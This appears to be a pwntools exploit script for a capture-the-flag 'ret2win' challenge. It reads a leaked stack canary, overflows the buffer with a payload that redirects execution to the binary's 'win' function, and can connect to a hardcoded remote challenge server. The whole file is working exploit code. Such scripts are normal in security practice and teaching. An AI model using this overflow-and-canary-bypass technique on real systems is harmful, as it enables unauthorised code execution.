#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./ret2win", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 103.185.44.122 19002"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

io.recvuntil(b"you: ")
canary = int(io.recvline(), 16)
log.info(f"{canary=:#x}")

ret = 0x004013d0
payload = b"A" * 0x68
payload += flat(
    canary,
    elf.bss(0xc00),
    ret,
    elf.sym["win"],
)

io.sendline(payload)

io.interactive()
